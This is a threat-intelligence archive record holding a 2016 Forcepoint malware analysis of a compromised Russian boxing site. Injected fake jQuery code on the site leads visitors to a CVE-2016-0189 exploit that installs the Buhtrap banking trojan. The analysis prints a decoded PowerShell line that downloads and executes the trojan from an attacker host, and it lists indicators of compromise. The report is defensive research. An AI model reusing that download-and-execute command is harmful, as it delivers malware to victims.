{
    "id": "1fbf440e-12a1-49eb-928f-6c2962b0cc90",
    "created_at": "2023-01-12T15:08:48.577353Z",
    "updated_at": "2025-03-27T02:09:33.406649Z",
    "deleted_at": null,
    "sha1_hash": "b11089d6f36fad71aa9664c871e0f18ba2f087d5",
    "title": "2016-09-28 - Highly Evasive Code Injection Awaits User Interaction Before Delivering Malware",
    "authors": "",
    "file_creation_date": "2022-05-28T02:07:42Z",
    "file_modification_date": "2022-05-28T02:07:42Z",
    "file_size": 170582,
    "plain_text": "# Highly Evasive Code Injection Awaits User Interaction Before Delivering Malware\n\n**[forcepoint.com/blog/security-labs/highly-evasive-code-injection-awaits-user-interaction-delivering-malware](https://www.forcepoint.com/blog/security-labs/highly-evasive-code-injection-awaits-user-interaction-delivering-malware)**\n\nSeptember 28, 2016\n\nOn September 27, 2016 Forcepoint Security Labs noticed that the Russian boxing\nsite allboxing[.]ru was compromised. The site is injected with code that attempts to silently\nredirect users to a third party website containing an exploit and a Russian banking trojan.\nThe injected code employs several evasion tactics, and ensures that the redirect only occurs\nwhen there is significant user interaction on the website.\n\n## Hiding in Plain Sight\n\nThe site allboxing[.]ru is a very popular Russian boxing website receiving an estimated 3\nmillion visitors per month.\n\nOne of the scripts being used by the website at hxxp://allboxing[.]ru/misc/jquery.once.js?\n_v=1.2 has been modified to include additional code. The code claims to be loading a jQuery_\nplugin called \"jQuery Animate Plugin v1.2\" but this is in fact a fake plugin inserted by the\nattacker.\n\n\n-----\n\nOnce of the giveaways here is that the URL reference for the plugin links\nto \"http://plugins.jquery.com/tag/animate\", whereas legitimate plugins will usually reference\nthe project name directly such as \"http://plugins.jquery.com/project/once\". Nevertheless, the\nattacker has made significant effort to blend in with the legitimate content by using the same\nformatting and comment style.\n\nThe modified jquery.once.js script loads a second script from /misc/jquery.animate.js which in\nturn attempts to insert a script from the attacker's own website. The script is not inserted if\nthe user's browser is either Chrome or Opera, presumably because the attacker is not able\nto exploit these browsers.\n\nThe automate.js script on getcanvas[.]org then waits for user interaction before inserting an\niFrame to an exploit.\n\n\n-----\n\nThe script ensures that sufficient user interaction has occurred from either clicking, scrolling\nor moving the mouse. The attacker has given different weighting scores to the different types\nof user interaction and will only insert the iFrame once the threshold score is above 30. This\n\n\n-----\n\nis a stealth tactic used to prevent automated analysis systems from being redirected to the\n[exploit. The technique was first documented back in 2014 in a similar infection chain.](http://malware.dontneedcoffee.com/2014/06/cottoncastle.html)\n\nAnother stealth tactic employed here is the domain name and URL path which has been\nused. The term \"canvas\" is a well known boxing term and the URL contains the\nword \"sport\". This makes the URL appear a lot less suspicious considering\nthat allboxing[.]ru is a boxing news site.\n\n## Exploiting Internet Explorer\n\nThe malicious iFrame inserted by the attacker was located\nat hxxp://getcanvas[.]org/sport/page/5.html. The page contains a VBScript exploit that\nleverages CVE-2016-0189 and attempts to run a Powershell script on the machine.\n\nThe Powershell script decodes to the following:\n```\n(New-Object\nSystem.Net.WebClient).DownloadFile(\"http://getcanvas.org/sport/boxing/tysonfury.jpg\",\"\n(New-Object -com Shell.Application).ShellExecute(\"islzma32.exe\");\n\n```\nThe script downloads and executes tysonfury.jpg which is a variant of the Buhtrap Russian\nbanking trojan. The SHA1 of the sample we received\nis b74f71560e48488d2153ae2fb51207a0ac206e2b.\n\n## Protection Statement\n\n[Forcepoint™ customers are protected against this threat via TRITON® ACE at the following](https://www.forcepoint.com/innovation/technology/triton-ace?cmpid=slbl)\nstages of attack:\n\n\n-----\n\nStage 2 (Lure) - The fake jQuery plugin is identified and blocked.\nStage 3 (Redirect) - The attempt to insert a malicious iFrame onto the page is blocked.\nStage 4 (Exploit) - The CVE-2016-0189 exploit is identified and blocked.\nStage 5 (Dropper) - The Buhtrap malware is prevented from being downloaded.\nStage 6 (Call Home) - Attempts by the Buhtrap variant to call home are identified and\nblocked.\n\n## Summary\n\nAttackers are getting better at disguising the code they inject into compromised websites.\nWebsites with high volumes of traffic are a popular choice for attackers, and this is especially\ntrue if the bulk of the traffic is from a specific region of the world of interest to the attacker.\nWith the [recent arrests of actors using the Lurk banking trojan, Buhtrap appears to be a likely](http://www.securityweek.com/50-hackers-using-lurk-banking-trojan-arrested-russia)\nalternative for actors wishing to target Russian banks and software.\n\n## Indicators of Compromise\n\n### Compromised Website\n```\nhxxp://allboxing.ru\n\n Exploit Sites\nhttp://getcanvas.org\nhttp://medioca-room02.org\n\n Buhtrap Sample (SHA1)\nb74f71560e48488d2153ae2fb51207a0ac206e2b\naa0fa4584768ce9e16d67d8c529233e99ff1bbf0\n193dd67915d544409e8c5722c22175b0f417999c\n\n Buhtrap Command-and-Control Server\nhttp://91.215.153.31/r/z.php\n\n About Forcepoint\n\n```\nForcepoint is the leading user and data protection cybersecurity company, entrusted to\nsafeguard organizations while driving digital transformation and growth. Our solutions adapt\nin real-time to how people interact with data, providing secure access while enabling\nemployees to create value.\n\n[Learn more about Forcepoint](https://www.forcepoint.com/company/about-us)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-09-28 - Highly Evasive Code Injection Awaits User Interaction Before Delivering Malware.pdf"
    ],
    "report_names": [
        "2016-09-28 - Highly Evasive Code Injection Awaits User Interaction Before Delivering Malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "3b046db2-f60e-49ae-8e16-0cf82a4be6fb",
            "created_at": "2022-10-25T16:07:23.427162Z",
            "updated_at": "2025-03-27T02:02:09.79482Z",
            "deleted_at": null,
            "main_name": "Buhtrap",
            "aliases": [
                "Buhtrap",
                "Operation TwoBee",
                "Ratopak Spider",
                "UAC-0008"
            ],
            "source_name": "ETDA:Buhtrap",
            "tools": [
                "AmmyyRAT",
                "Buhtrap",
                "CottonCastle",
                "FlawedAmmyy",
                "NSIS",
                "Niteris EK",
                "Nullsoft Scriptable Install System",
                "Ratopak"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dcba8e2b-93e0-4d6e-a15f-5c44faebc3b1",
            "created_at": "2022-10-25T16:07:23.816991Z",
            "updated_at": "2025-03-27T02:02:09.991944Z",
            "deleted_at": null,
            "main_name": "Lurk",
            "aliases": [],
            "source_name": "ETDA:Lurk",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "01d569b1-f089-4a8f-8396-85078b93da26",
            "created_at": "2023-01-06T13:46:38.411615Z",
            "updated_at": "2025-03-27T02:00:02.826863Z",
            "deleted_at": null,
            "main_name": "BuhTrap",
            "aliases": [],
            "source_name": "MISPGALAXY:BuhTrap",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536128,
    "ts_updated_at": 1743041373,
    "ts_creation_date": 1653703662,
    "ts_modification_date": 1653703662,
    "files": {
        "pdf": "https://archive.orkl.eu/b11089d6f36fad71aa9664c871e0f18ba2f087d5.pdf",
        "text": "https://archive.orkl.eu/b11089d6f36fad71aa9664c871e0f18ba2f087d5.txt",
        "img": "https://archive.orkl.eu/b11089d6f36fad71aa9664c871e0f18ba2f087d5.jpg"
    }
}